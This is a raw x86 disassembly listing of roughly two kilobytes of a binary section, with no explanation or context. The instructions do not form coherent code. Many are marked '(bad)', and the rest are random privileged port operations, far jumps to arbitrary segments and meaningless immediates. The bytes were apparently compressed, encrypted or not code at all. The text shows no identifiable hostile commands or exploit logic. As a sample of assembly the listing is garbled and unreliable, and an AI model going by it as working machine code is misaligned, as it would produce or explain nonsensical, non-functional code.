  41a3fc:	lds    edi,FWORD PTR [esi+0x11]
  41a3ff:	add    dl,BYTE PTR ds:0xb8698b55
  41a405:	add    esi,DWORD PTR [ebx-0x22]
  41a408:	mov    ah,0xe9
  41a40a:	into   
  41a40b:	das    
  41a40c:	(bad)  
  41a40d:	and    eax,DWORD PTR ds:0x6943034f
  41a413:	addr16 clc 
  41a415:	inc    esp
  41a416:	ret    
  41a417:	out    dx,al
  41a418:	push   ebx
  41a419:	dec    ebx
  41a41a:	retf   0x8e37
  41a41d:	loope  0x41a3d3
  41a41f:	push   ds
  41a420:	mov    dh,0x7b
  41a422:	icebp  
  41a423:	outs   dx,BYTE PTR ds:[esi]
  41a424:	ja     0x41a3df
  41a426:	sub    bl,BYTE PTR [ebx+0x5b4169ee]
  41a42c:	mov    esi,0x97d55e1f
  41a431:	push   ds
  41a432:	mov    eax,0xdfd6ccd
  41a437:	gs xchg edx,eax
  41a439:	cmp    BYTE PTR [ebp+0x28dd92bb],ah
  41a43f:	scas   eax,DWORD PTR es:[edi]
  41a440:	ss mov ecx,0x73910adc
  41a446:	es addr16 cmc 
  41a449:	add    WORD PTR [ebx+0x77],dx
  41a44d:	mov    edi,0x4962019a
  41a452:	inc    ebp
  41a453:	jg     0x41a43f
  41a455:	ror    DWORD PTR [edi+0x17],0x60
  41a459:	cmp    edx,0x8589e268
  41a45f:	pop    esp
  41a460:	ins    DWORD PTR es:[edi],dx
  41a461:	fsub   st,st(7)
  41a463:	add    esp,DWORD PTR [eax+0x35]
  41a466:	cdq    
  41a467:	xor    al,0xc
  41a469:	adc    cl,BYTE PTR [eax]
  41a46b:	and    BYTE PTR [ebp-0xedb9982],dh
  41a471:	lock xchg edx,eax
  41a473:	jmp    0xc00b:0x98710cfa
  41a47a:	in     eax,dx
  41a47b:	add    al,0xa6
  41a47d:	xor    cl,al
  41a47f:	xor    DWORD PTR [ebx],edx
  41a481:	and    ch,BYTE PTR [ecx]
  41a483:	jp     0x41a430
  41a485:	lea    esp,[eax]
  41a487:	dec    ebp
  41a488:	cs xchg esp,eax
  41a48a:	sbb    esp,DWORD PTR [eax+eax*4]
  41a48d:	mov    WORD PTR [ecx-0x39],cs
  41a490:	icebp  
  41a491:	fwait
  41a492:	mov    ah,0xd7
  41a494:	out    0x2d,eax
  41a496:	out    0xbd,eax
  41a498:	sti    
  41a499:	sub    bh,BYTE PTR [ecx+ebp*2]
  41a49c:	xor    eax,0xc389984c
  41a4a1:	pop    esi
  41a4a2:	fisubr WORD PTR [esi+ebx*8+0x7d]
  41a4a6:	test   DWORD PTR [esi+ebx*8+0xb],eax
  41a4aa:	sbb    esi,DWORD PTR [ecx-0x61]
  41a4ad:	call   0x83bf:0x2ffbe594
  41a4b4:	iret   
  41a4b5:	push   es
  41a4b6:	les    esi,FWORD PTR ds:[ebx+0x9]
  41a4ba:	mov    ebx,0x8461c094
  41a4bf:	fld    TBYTE PTR [esi]
  41a4c1:	mov    WORD PTR [edx+0x6c53c2c],fs
  41a4c7:	rcr    DWORD PTR [ebx],cl
  41a4c9:	ins    DWORD PTR es:[edi],dx
  41a4ca:	addr16 ret 
  41a4cc:	cli    
  41a4cd:	pushf  
  41a4ce:	in     al,0xb0
  41a4d0:	add    esp,DWORD PTR [ebx+esi*2-0x61ac9aa5]
  41a4d7:	xor    ebx,eax
  41a4d9:	in     eax,dx
  41a4da:	xchg   edi,eax
  41a4db:	cmp    al,0x9
  41a4dd:	nop
  41a4de:	push   ecx
  41a4df:	fnstsw WORD PTR ds:0x2781f787
  41a4e5:	mov    ebx,0xdb0fe4f9
  41a4ea:	fnstenv [ebx-0x39d70b4c]
  41a4f0:	mov    eax,0x42ebfe7e
  41a4f5:	sbb    al,0x51
  41a4f7:	push   DWORD PTR [esi+0x52]
  41a4fa:	and    eax,0x94a18b39
  41a4ff:	pop    edi
  41a500:	fild   DWORD PTR [eax-0x6f]
  41a503:	imul   edx,DWORD PTR [esi+0x7dbace05],0x671a1b77
  41a50d:	aam    0x92
  41a50f:	iret   
  41a510:	pop    ebp
  41a511:	sbb    dh,BYTE PTR [edi]
  41a513:	push   esi
  41a514:	jae    0x41a52a
  41a516:	xchg   ebx,eax
  41a517:	inc    ebx
  41a518:	and    DWORD PTR [ebp-0x39],ebp
  41a51b:	fidiv  DWORD PTR [edi]
  41a51d:	test   al,0x92
  41a51f:	xchg   DWORD PTR [ecx-0x27],ecx
  41a522:	or     DWORD PTR [ebx*4-0x698e2b5e],ecx
  41a529:	loopne 0x41a4e6
  41a52b:	paddd  mm7,mm5
  41a52e:	rcl    DWORD PTR [ebp-0xe442dee],0x94
  41a535:	scas   al,BYTE PTR es:[edi]
  41a536:	pop    esi
  41a537:	imul   edx,DWORD PTR [esi-0x68],0x12
  41a53b:	jo     0x41a50d
  41a53d:	clc    
  41a53e:	ficom  DWORD PTR [ebx]
  41a540:	loope  0x41a4d1
  41a542:	xchg   ebp,eax
  41a543:	and    al,0x99
  41a545:	adc    DWORD PTR [eax],eax
  41a547:	inc    ecx
  41a548:	retf   
  41a549:	test   eax,0x83927480
  41a54e:	mov    edx,0x5264af11
  41a553:	xchg   edx,eax
  41a554:	mov    BYTE PTR [edi+0x3570c73c],dh
  41a55a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a55b:	add    ah,bl
  41a55d:	mov    eax,ds:0x4e461ea4
  41a562:	push   edi
  41a563:	inc    ebx
  41a564:	test   bl,0x2f
  41a567:	xchg   ebx,eax
  41a568:	push   eax
  41a569:	shr    DWORD PTR [ecx],0xd9
  41a56c:	pop    edx
  41a56d:	push   edi
  41a56e:	std    
  41a56f:	add    DWORD PTR [ebp+edi*4+0x40],0xffffff9c
  41a574:	outs   dx,BYTE PTR ds:[esi]
  41a575:	jle    0x41a5bf
  41a577:	not    BYTE PTR [eax+0x2a425373]
  41a57d:	dec    edi
  41a57e:	push   edx
  41a57f:	or     eax,0x2385ad9d
  41a584:	cli    
  41a585:	enter  0xb813,0x89
  41a589:	and    al,0xf8
  41a58b:	mov    dl,BYTE PTR [esi-0x7e9b9927]
  41a591:	test   eax,0x2c0b5813
  41a596:	(bad)  
  41a597:	xchg   ecx,eax
  41a598:	retf   0x54ea
  41a59b:	popf   
  41a59c:	repnz jmp 0x89e4:0x73da8cec
  41a5a4:	retf   0xe0dd
  41a5a7:	xor    eax,0x8dcf6cd5
  41a5ac:	pcmpgtw mm6,QWORD PTR [ecx]
  41a5af:	shl    DWORD PTR [esp+eax*4+0x2cc4c4ae],1
  41a5b6:	test   DWORD PTR [ebx],ebp
  41a5b8:	shr    DWORD PTR [ebp-0x7a6f9640],0xf
  41a5bf:	bound  edx,QWORD PTR [esi-0x7c51db4d]
  41a5c5:	test   al,0x67
  41a5c7:	mov    bl,0x6
  41a5c9:	and    DWORD PTR [eax],ebx
  41a5cb:	fs inc ebp
  41a5cd:	in     eax,0x1c
  41a5cf:	mov    esi,0x8bd01451
  41a5d4:	pop    eax
  41a5d5:	lahf   
  41a5d6:	jle    0x41a5cb
  41a5d8:	not    BYTE PTR [edx-0x58]
  41a5db:	jg     0x41a631
  41a5dd:	mov    DWORD PTR [eax+0x86dba1],ebp
  41a5e3:	inc    BYTE PTR [esp+edi*2-0x53]
  41a5e7:	mov    edi,0x96cffaac
  41a5ec:	cld    
  41a5ed:	mov    eax,ds:0xe9f4ad43
  41a5f2:	xor    esp,DWORD PTR [esi+0x44360634]
  41a5f8:	xchg   edx,eax
  41a5f9:	mov    edx,gs
  41a5fb:	push   esi
  41a5fc:	lea    edx,[eax+0x242c1c6]
  41a602:	fdiv   QWORD PTR [esi]
  41a604:	xor    bh,BYTE PTR [ebp-0x3a8324c]
  41a60a:	push   ss
  41a60b:	add    DWORD PTR [eax-0x36],edi
  41a60e:	xor    BYTE PTR [ebx],0xd1
  41a611:	xchg   esi,eax
  41a612:	xchg   esp,eax
  41a613:	int3   
  41a614:	rcr    DWORD PTR [eax+0x6d],cl
  41a617:	out    dx,al
  41a618:	iret   
  41a619:	mov    ch,BYTE PTR [edx-0x19e0fb5c]
  41a61f:	ror    BYTE PTR [edi+ecx*4+0x48],1
  41a623:	jmp    DWORD PTR [eax+0x56]
  41a626:	push   es
  41a627:	dec    esi
  41a628:	icebp  
  41a629:	leave  
  41a62a:	ja     0x41a628
  41a62c:	jns    0x41a66c
  41a62e:	or     al,0x73
  41a630:	bound  esi,QWORD PTR [edx]
  41a632:	ror    BYTE PTR [edi],0xe4
  41a635:	js     0x41a5c9
  41a637:	push   ss
  41a638:	adc    ch,BYTE PTR [edi]
  41a63a:	xor    al,0xe1
  41a63c:	repz and ch,BYTE PTR [esi-0x7030128]
  41a643:	ud2    
  41a645:	mov    ds:0x3e3432e2,eax
  41a64a:	pop    ebx
  41a64b:	pusha  
  41a64c:	sbb    eax,0x3089877f
  41a651:	xor    ebx,ecx
  41a653:	mov    edi,0xb2105720
  41a658:	jnp    0x41a5ef
  41a65a:	mov    WORD PTR [edi-0x12067933],gs
  41a660:	pop    ss
  41a661:	sub    BYTE PTR [ebp+0x6],ch
  41a664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a665:	ret    0xc666
  41a668:	push   ds
  41a669:	mov    ebx,0xb393e01e
  41a66e:	stos   DWORD PTR es:[edi],eax
  41a66f:	dec    edx
  41a670:	jne    0x41a611
  41a672:	call   0xe824d1dd
  41a677:	cmp    ah,BYTE PTR [edi-0x7e]
  41a67a:	and    DWORD PTR [ebp+0x5],ebp
  41a67d:	sbb    BYTE PTR fs:[ebx+eiz*8],dl
  41a681:	jnp    0x41a627
  41a683:	mov    bh,0x79
  41a685:	push   edi
  41a686:	mov    ebp,esp
  41a688:	dec    ebx
  41a689:	inc    edx
  41a68a:	or     edi,DWORD PTR [esi+0x2f167a51]
  41a690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a691:	outs   dx,BYTE PTR ds:[esi]
  41a692:	ins    BYTE PTR es:[edi],dx
  41a693:	sbb    BYTE PTR [edi+0xff374b8],bl
  41a699:	int    0xed
  41a69b:	je     0x41a6f7
  41a69d:	mov    gs,WORD PTR [edx+0x67]
  41a6a0:	or     BYTE PTR [esi+edi*4-0xf],ch
  41a6a4:	in     al,dx
  41a6a5:	ins    DWORD PTR es:[edi],dx
  41a6a6:	push   eax
  41a6a7:	in     al,dx
  41a6a8:	scas   al,BYTE PTR es:[edi]
  41a6a9:	idiv   BYTE PTR [eax+0xd]
  41a6ac:	pop    ebx
  41a6ad:	xor    al,0x9c
  41a6af:	mov    ebx,0xe4273fb1
  41a6b4:	lods   al,BYTE PTR ds:[esi]
  41a6b5:	leave  
  41a6b6:	arpl   bx,cx
  41a6b8:	shl    ebp,0x20
  41a6bb:	fnsave [ecx+0x72]
  41a6be:	mov    al,0x78
  41a6c0:	mov    ds:0x753148eb,al
  41a6c5:	ror    DWORD PTR [ecx+0x7],1
  41a6c8:	sar    esi,1
  41a6ca:	into   
  41a6cb:	shl    BYTE PTR [esi+0x3bae4154],1
  41a6d1:	imul   eax,eax,0x808e0121
  41a6d7:	jecxz  0x41a6d2
  41a6d9:	xchg   ecx,eax
  41a6da:	xchg   edx,eax
  41a6db:	jg     0x41a75b
  41a6dd:	mov    cl,0x4f
  41a6df:	jne    0x41a73f
  41a6e1:	add    edi,0x475a0ac8
  41a6e7:	xchg   esi,eax
  41a6e8:	lahf   
  41a6e9:	inc    DWORD PTR [edi+eax*1-0x6cd7634]
  41a6f0:	adc    edi,DWORD PTR [ecx]
  41a6f2:	repz stc 
  41a6f4:	and    bl,BYTE PTR [eax+0x31e2ab58]
  41a6fa:	pusha  
  41a6fb:	repz gs lahf 
  41a6fe:	push   ebx
  41a6ff:	add    BYTE PTR gs:[ecx+ebp*4-0x36],bh
  41a704:	jmp    0x41a6fd
  41a706:	jecxz  0x41a6aa
  41a708:	mov    ebp,0x24a1efd3
  41a70d:	pop    eax
  41a70e:	add    cl,ch
  41a710:	inc    edx
  41a711:	hlt    
  41a712:	jb     0x41a6d5
  41a714:	adc    al,0x83
  41a716:	repnz pusha 
  41a718:	out    dx,eax
  41a719:	call   0x8d50beaa
  41a71e:	push   0xc48b77c2
  41a723:	cmp    ch,ch
  41a725:	push   0x1c
  41a727:	sar    DWORD PTR [esi+0x25b4e9ab],1
  41a72d:	imul   edx,DWORD PTR [edx],0xe991d025
  41a733:	stos   DWORD PTR es:[edi],eax
  41a734:	nop
  41a735:	and    esi,DWORD PTR [edx+0x76]
  41a738:	mov    bl,0x58
  41a73a:	sub    eax,0xb3153b12
  41a73f:	dec    eax
  41a740:	jp     0x41a71b
  41a742:	xchg   ecx,eax
  41a743:	jge    0x41a73f
  41a745:	out    dx,al
  41a746:	inc    ecx
  41a747:	jno    0x41a705
  41a749:	xor    esp,esp
  41a74b:	(bad)  
  41a74d:	adc    edi,edi
  41a74f:	stos   DWORD PTR es:[edi],eax
  41a750:	or     DWORD PTR [ebx-0x37],esp
  41a753:	dec    eax
  41a754:	jmp    FWORD PTR [ebp-0x63]
  41a757:	jbe    0x41a70a
  41a759:	adc    ah,dl
  41a75b:	cmp    esi,DWORD PTR [eax-0x2f404e27]
  41a761:	inc    esi
  41a762:	retf   
  41a763:	cmovnp ebp,DWORD PTR [edx+eax*4-0x70cf72cc]
  41a76b:	mov    eax,ds:0x4c4aa7cc
  41a770:	mov    ecx,DWORD PTR [edi]
  41a772:	cmc    
  41a773:	and    eax,0xb38e8bd4
  41a778:	sti    
  41a779:	adc    eax,0xb7c0e909
  41a77e:	push   esp
  41a77f:	rol    DWORD PTR [edi],0xca
  41a782:	pop    ds
  41a783:	pop    edx
  41a784:	xor    BYTE PTR [ebx+0x2c114df0],al
  41a78a:	repnz mov cl,0xfd
  41a78d:	int3   
  41a78e:	adc    BYTE PTR [ebx-0x29468295],dl
  41a794:	sbb    DWORD PTR ds:0x5663b5d0,eax
  41a79a:	pop    edx
  41a79b:	sbb    BYTE PTR [eax-0x430e4d81],al
  41a7a1:	add    DWORD PTR [ecx+0x17],0xd87f0e27
  41a7a8:	adc    cl,BYTE PTR [edi+0xd]
  41a7ab:	ffree  st(4)
  41a7ad:	int3   
  41a7ae:	push   ebp
  41a7af:	call   FWORD PTR [ecx+0x4dbdd32f]
  41a7b5:	inc    ecx
  41a7b6:	(bad)  
  41a7b7:	int    0x5
  41a7b9:	jns    0x41a7eb
  41a7bb:	in     al,dx
  41a7bc:	fwait
  41a7bd:	pop    esp
  41a7be:	mov    ecx,0x5e13af81
  41a7c3:	jle    0x41a74f
  41a7c5:	push   ds
  41a7c6:	pop    ss
  41a7c7:	call   0xc789:0x706207b6
  41a7ce:	add    eax,0xf9cc922f
  41a7d3:	ret    0xc85d
  41a7d6:	hlt    
  41a7d7:	sbb    DWORD PTR [ebp+0x64fb1a96],esi
  41a7dd:	aam    0xb0
  41a7df:	jl     0x41a765
  41a7e1:	jmp    0x5ac14e18
  41a7e6:	test   BYTE PTR [edi+0x645aac2c],0x12
  41a7ed:	(bad)  
  41a7ee:	int3   
  41a7ef:	add    eax,0x975d0ac8
  41a7f4:	push   ebx
  41a7f5:	ret    
  41a7f6:	call   0x4ceb06ac
  41a7fb:	(bad)  
  41a7fc:	pop    edx
  41a7fd:	aas    
  41a7fe:	pop    eax
  41a7ff:	mov    al,ds:0x62f85ad7
  41a804:	lea    edi,[edx-0x43]
  41a807:	fs mov eax,0x4d232fcf
  41a80d:	lods   eax,DWORD PTR ds:[esi]
  41a80e:	dec    edx
  41a80f:	push   ecx
  41a810:	lea    ebx,[ebp-0x17471b14]
  41a816:	inc    edi
  41a817:	sub    eax,0x11528d7d
  41a81c:	aas    
  41a81d:	adc    eax,0x12f61ae3
  41a822:	mov    cl,0x6b
  41a824:	inc    ebx
  41a825:	push   edx
  41a826:	rcl    BYTE PTR [esi+0x13359c72],1
  41a82c:	call   0x9ee1465d
  41a831:	sbb    ebp,edx
  41a833:	xor    eax,0xf811c81a
  41a838:	dec    eax
  41a839:	or     ah,BYTE PTR [bx+si+0x68]
  41a83d:	cs push ebp
  41a83f:	push   es
  41a840:	or     edi,esp
  41a842:	pop    ss
  41a843:	jno    0x41a811
  41a845:	mov    bl,BYTE PTR [eax]
  41a847:	out    dx,eax
  41a848:	mov    esi,0x328e273b
  41a84d:	enter  0x4f59,0x28
  41a851:	ficomp WORD PTR [ecx-0x70]
  41a854:	and    al,0xa0
  41a856:	shl    bh,0xf1
  41a859:	lea    esi,[ecx+0x5c]
  41a85c:	mov    ds:0xb32fa45d,eax
  41a861:	pop    eax
  41a862:	ror    bh,1
  41a864:	(bad)  
  41a865:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a866:	rcl    BYTE PTR [ebp-0x6dd51208],0xf7
  41a86d:	enter  0x3f60,0xab
  41a871:	fadd   QWORD PTR [edx-0x324158ee]
  41a877:	call   0x1bcdb74b
  41a87c:	cmp    ch,ch
  41a87e:	dec    edi
  41a87f:	test   DWORD PTR [eax+0x3e0e2589],esi
  41a885:	mov    cl,0xfb
  41a887:	cmp    DWORD PTR [ebp+esi*8+0x26b8d05a],eax
  41a88e:	and    al,0x8
  41a890:	mov    ds:0x88f5577,eax
  41a895:	imul   ax
  41a898:	mov    WORD PTR [esp+eax*1],ds
  41a89b:	xchg   edx,eax
  41a89c:	cmp    ch,BYTE PTR [esi-0x6c]
  41a89f:	mov    ch,0x3e
  41a8a1:	add    esi,ebp
  41a8a3:	(bad)  
  41a8a5:	or     ch,BYTE PTR [ecx+0x25]
  41a8a8:	loope  0x41a900
  41a8aa:	je     0x41a925
  41a8ac:	cmp    eax,0x1683ac15
  41a8b1:	or     ch,ah
  41a8b3:	scas   al,BYTE PTR es:[edi]
  41a8b4:	mov    al,0x39
  41a8b6:	bound  edx,QWORD PTR [edx+edx*2+0x3c]
  41a8ba:	rcr    DWORD PTR [ecx],cl
  41a8bc:	lsl    esi,WORD PTR [ecx-0x50]
  41a8c0:	in     al,dx
  41a8c1:	sbb    BYTE PTR [edx],0x88
  41a8c4:	and    eax,0x1146c3c9
  41a8c9:	fistp  DWORD PTR [eax-0x71]
  41a8cc:	rcl    edx,1
  41a8ce:	ror    DWORD PTR [ebp-0x5d0483],0x4
  41a8d5:	in     al,0x58
  41a8d7:	ins    DWORD PTR es:[edi],dx
  41a8d8:	xchg   ecx,eax
  41a8d9:	cmp    dh,BYTE PTR [edi-0x22]
  41a8dc:	(bad)  
  41a8dd:	and    ebp,DWORD PTR ds:0x74fa7baf
  41a8e3:	(bad)  
  41a8e4:	cmp    al,BYTE PTR [ebp-0x12]
  41a8e7:	pop    ds
  41a8e8:	repnz stc 
  41a8ea:	lods   al,BYTE PTR ds:[esi]
  41a8eb:	mov    eax,0x7c14fd82
  41a8f0:	mov    dh,0xd8
  41a8f2:	or     ah,0xa6
  41a8f5:	(bad)  
  41a8f6:	ins    BYTE PTR es:[edi],dx
  41a8f7:	mov    ah,0x95
  41a8f9:	xchg   edi,eax
  41a8fa:	xor    edx,DWORD PTR [ecx-0x76aad5af]
  41a900:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a901:	es add eax,ebx
  41a904:	and    ch,dl
  41a906:	mov    edi,0x19645653
  41a90b:	pop    es
  41a90c:	or     eax,0xb874abcf
  41a911:	dec    eax
  41a912:	mov    edx,0x8a4dd3c0
  41a917:	inc    esi
  41a918:	dec    edi
  41a919:	aaa    
  41a91a:	fmul   st(7),st
  41a91c:	push   ss
  41a91d:	sbb    edx,esi
  41a91f:	inc    ecx
  41a920:	test   eax,0x9c15218d
  41a925:	into   
  41a926:	add    ecx,DWORD PTR [eax-0x1f]
  41a929:	(bad)  
  41a92a:	(bad)  
  41a92b:	pushf  
  41a92c:	in     al,dx
  41a92d:	xchg   edx,eax
  41a92e:	data16 sti 
  41a930:	retf   0x2bfd
  41a933:	hlt    
  41a934:	pop    ds
  41a935:	loop   0x41a96c
  41a937:	je     0x41a944
  41a939:	sar    BYTE PTR [edi],1
  41a93b:	in     al,0x9c
  41a93d:	inc    esp
  41a93e:	xlat   BYTE PTR ds:[ebx]
  41a93f:	ins    DWORD PTR es:[edi],dx
  41a940:	into   
  41a941:	mov    ah,0xe4
  41a943:	push   eax
  41a944:	xchg   BYTE PTR [eax+0x34],dh
  41a947:	dec    ebp
  41a948:	idiv   BYTE PTR [esi-0x7e]
  41a94b:	sub    dh,BYTE PTR [edx+0x67cf12ed]
  41a951:	xchg   esp,eax
  41a952:	stc    
  41a953:	shl    BYTE PTR [ebx],0x83
  41a956:	pusha  
  41a957:	stc    
  41a958:	ds push esi
  41a95a:	inc    ecx
  41a95b:	push   eax
  41a95c:	leave  
  41a95d:	push   ebx
  41a95e:	sbb    BYTE PTR [edx+0x42750c4],dl
  41a964:	xchg   ebx,eax
  41a965:	push   ss
  41a966:	aaa    
  41a967:	addr16 sar ebp,0xef
  41a96b:	jg     0x41a8ff
  41a96d:	push   ds
  41a96e:	pusha  
  41a96f:	in     al,dx
  41a970:	test   al,0x85
  41a972:	mov    cl,0x47
  41a974:	xchg   ecx,eax
  41a975:	loopne 0x41a9c7
  41a977:	jecxz  0x41a9e1
  41a979:	scas   al,BYTE PTR es:[edi]
  41a97a:	jno    0x41a95c
  41a97c:	push   ecx
  41a97d:	test   al,0x43
  41a97f:	in     eax,0x2d
  41a981:	adc    al,0x4f
  41a983:	add    esp,DWORD PTR [ebp+0x14]
  41a986:	(bad)
  41a98a:	dec    ebp
  41a98b:	fimul  WORD PTR [esi]
  41a98d:	xchg   edx,eax
  41a98e:	mov    edx,DWORD PTR [ebx+0x316d212a]
  41a994:	das    
  41a995:	ins    DWORD PTR es:[edi],dx
  41a996:	call   0x3ebc:0x38a155e5
  41a99d:	call   0xd02b4eb5
  41a9a2:	dec    ecx
  41a9a3:	add    BYTE PTR [edi],dl
  41a9a5:	and    eax,0x5a333ebb
  41a9aa:	data16 jbe 0x41a9af
  41a9ad:	mov    bh,0xee
  41a9af:	pop    esi
  41a9b0:	outs   dx,BYTE PTR ds:[esi]
  41a9b1:	outs   dx,BYTE PTR ds:[esi]
  41a9b2:	xchg   esi,eax
  41a9b3:	fwait
  41a9b4:	lea    edx,[esi+0x3a7d20b3]
  41a9ba:	mov    ds:0xba1037fc,al
  41a9bf:	mov    ah,0x7b
  41a9c1:	jb     0x41a982
  41a9c3:	xchg   eax,ecx
  41a9c5:	fld    st(5)
  41a9c7:	pop    ebx
  41a9c8:	xchg   ebx,eax
  41a9c9:	pop    esp
  41a9ca:	sub    eax,0x52c91159
  41a9cf:	shr    BYTE PTR [esp+eax*1],0xe7
  41a9d3:	pop    esi
  41a9d4:	popf   
  41a9d5:	test   al,0xa0
  41a9d7:	mov    eax,0x8d51df4d
  41a9dc:	xor    BYTE PTR [ebp+ebx*8-0x64],ah
  41a9e0:	aaa    
  41a9e1:	rol    DWORD PTR [ecx+0x40880aef],cl
  41a9e7:	out    0x92,eax
  41a9e9:	sub    eax,0x3f2855ed
  41a9ee:	inc    esi
  41a9ef:	adc    BYTE PTR [eax+edi*4],bl
  41a9f2:	lock add DWORD PTR [ebp+0x1aceedb1],esi
  41a9f9:	push   cs
  41a9fa:	push   edi
  41a9fb:	fwait
  41a9fc:	lea    ecx,[ebx]
  41a9fe:	or     al,ch
  41aa00:	adc    DWORD PTR [ecx],edx
  41aa02:	mov    BYTE PTR [ecx+0x43],bl
  41aa05:	outs   dx,BYTE PTR ds:[esi]
  41aa06:	add    eax,0xf49d6f95
  41aa0b:	cmc    
  41aa0c:	mov    al,BYTE PTR [edi+0x2b]
  41aa0f:	in     eax,dx
  41aa10:	jo     0x41aa32
  41aa12:	push   esp
  41aa13:	ss inc esp
  41aa15:	cmp    al,0x4e
  41aa17:	fbld   TBYTE PTR [ebp-0x18]
  41aa1a:	into   
  41aa1b:	add    BYTE PTR [ebx+0x7596a2dc],cl
  41aa21:	fdivr  QWORD PTR [ebx-0x50]
  41aa24:	ds dec esp
  41aa26:	or     eax,0x25523069
  41aa2b:	std    
  41aa2c:	or     DWORD PTR [ebx+eiz*1+0x7b],ebp
  41aa30:	jge    0x41aa99
  41aa32:	int    0x2f
  41aa34:	daa    
  41aa35:	mov    ds:0xf233e2aa,al
  41aa3a:	xchg   esi,eax
  41aa3b:	stos   BYTE PTR es:[edi],al
  41aa3c:	dec    edx
  41aa3d:	test   al,0x21
  41aa3f:	mov    ah,0xa8
  41aa41:	mov    dh,0x20
  41aa43:	sub    esi,DWORD PTR [ebp+0x7bb7eab0]
  41aa49:	push   0xffffffef
  41aa4b:	ret    
  41aa4c:	cmp    esi,DWORD PTR [ebx+edx*8-0x3d]
  41aa50:	and    edx,DWORD PTR [edi+0x28450ad0]
  41aa56:	ss or  al,0xb3
  41aa59:	inc    edx
  41aa5a:	lds    esp,FWORD PTR [ecx]
  41aa5c:	sub    eax,0x1cd2d8f7
  41aa61:	test   bl,bl
  41aa63:	pop    esp
  41aa64:	jne    0x41aa13
  41aa66:	(bad)  
  41aa67:	lock out dx,al
  41aa69:	fbstp  TBYTE PTR ds:0x9b4c5796
  41aa6f:	pusha  
  41aa70:	and    ebp,DWORD PTR [esi+0xaf0e499]
  41aa76:	retf   
  41aa77:	outs   dx,DWORD PTR ds:[esi]
  41aa78:	inc    esp
  41aa79:	jb     0x41aadb
  41aa7b:	sub    al,bl
  41aa7d:	sbb    BYTE PTR [esi+0x441c6f8f],ah
  41aa83:	repnz shl DWORD PTR [eax+ecx*4-0x27],cl
  41aa88:	xchg   BYTE PTR [ecx+0x21e07390],bh
  41aa8e:	sbb    DWORD PTR [edx-0x7520c6b1],eax
  41aa94:	mov    DWORD PTR [ebp-0x18ba1ea3],edx
  41aa9a:	das    
  41aa9b:	mov    cl,0x1e
  41aa9d:	dec    ecx
  41aa9e:	inc    ebp
  41aa9f:	mov    al,ds:0x256fa95e
  41aaa4:	dec    eax
  41aaa5:	mov    bl,0xda
  41aaa7:	mov    edi,edx
  41aaa9:	lods   eax,DWORD PTR ds:[esi]
  41aaaa:	jp     0x41aa90
  41aaac:	adc    dl,0xcc
  41aaaf:	adc    DWORD PTR [eiz*2-0x640dab6e],esi
  41aab6:	xchg   edi,eax
  41aab7:	je     0x41aa39
  41aab9:	(bad)  
  41aaba:	cmp    eax,DWORD PTR [edi-0x3f3f2ca]
  41aac0:	inc    esp
  41aac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aac2:	mov    cs,WORD PTR [ebx+edx*1]
  41aac5:	mov    dl,0xc
  41aac7:	dec    ebp
  41aac8:	dec    esi
  41aaca:	xor    BYTE PTR [edx+0x13d30dff],0x11
  41aad1:	shl    BYTE PTR [esi],cl
  41aad3:	jne    0x41aaf5
  41aad5:	pushf  
  41aad6:	retf   0xd630
  41aad9:	mov    ds,WORD PTR [edi-0x40]
  41aadc:	push   ebx
  41aadd:	hlt    
  41aade:	(bad)  
  41aadf:	or     eax,0x98300dff
  41aae4:	push   ebp
  41aae5:	mov    ds:0xd8480f57,eax
  41aaea:	cwde   
  41aaeb:	retf   0xe28a
  41aaee:	popf   
  41aaef:	xchg   esi,eax
  41aaf0:	loope  0x41aab8
  41aaf2:	cs dec ebp
  41aaf4:	lahf   
  41aaf5:	out    dx,eax
  41aaf6:	mov    bh,0xab
  41aaf8:	test   DWORD PTR [esi+0x7a],ecx
  41aafb:	mov    ds:0x40eec6ec,eax
  41ab00:	cmc    
  41ab01:	cmp    al,0xb5
  41ab03:	and    al,0x7e
  41ab05:	(bad)  
  41ab06:	in     eax,dx
  41ab07:	shr    DWORD PTR [esp+ebx*8+0x1629b69d],cl
  41ab0e:	mov    dh,0x62
  41ab10:	neg    DWORD PTR [edx]
  41ab12:	ins    BYTE PTR es:[edi],dx
  41ab13:	call   ecx
  41ab15:	shl    edx,cl
  41ab17:	sbb    eax,DWORD PTR [ebx+0x7f]
  41ab1a:	add    bh,bl
  41ab1c:	cmp    al,0xc6
  41ab1e:	inc    edi
  41ab1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab20:	pop    esp
  41ab21:	mov    fs,esi
  41ab23:	mov    eax,ds:0x7f305b1f
  41ab28:	(bad)  
  41ab29:	hlt    
  41ab2a:	test   DWORD PTR [eax-0x4dd658c1],eax
  41ab30:	and    ebp,DWORD PTR [esi-0x3729a55a]
  41ab36:	pop    ss
  41ab37:	dec    eax
  41ab38:	inc    ecx
  41ab39:	pop    ebx
  41ab3a:	cdq    
  41ab3b:	mov    edx,0xf5ff1b75
  41ab40:	imul   esp,ecx,0x37774f8f
  41ab46:	jb     0x41aae8
  41ab48:	and    al,0xe4
  41ab4a:	cmp    bl,0x90
  41ab4d:	jb     0x41ab72
  41ab4f:	imul   ecx,DWORD PTR [ebx],0x5c
  41ab52:	jno    0x41ab04
  41ab54:	(bad)  
  41ab55:	dec    edx
  41ab56:	out    dx,eax
  41ab57:	mov    dl,0xca
  41ab59:	in     al,dx
  41ab5a:	dec    esi
  41ab5b:	je     0x41abb4
  41ab5d:	and    BYTE PTR [ebx+eax*2],bh
  41ab60:	mov    dl,0x38
  41ab62:	dec    edx
  41ab64:	inc    ebp
  41ab65:	inc    eax
  41ab66:	cmp    al,BYTE PTR [ebx+0x1100043c]
  41ab6c:	sub    eax,0x88e76c3e
  41ab71:	mov    eax,ds:0x4f2083a
  41ab76:	retf   0x9803
  41ab79:	mov    bh,0xf0
  41ab7b:	sub    esp,eax
  41ab7d:	test   eax,0xd008f58b
  41ab82:	mov    WORD PTR [ebp-0x7190e3f7],?
  41ab88:	les    edi,FWORD PTR [ecx+0x59]
  41ab8b:	dec    eax
  41ab8c:	and    eax,0x3b13dd29
  41ab91:	mov    bl,0x26
  41ab93:	dec    ebp
  41ab94:	mov    edx,0x9368b230
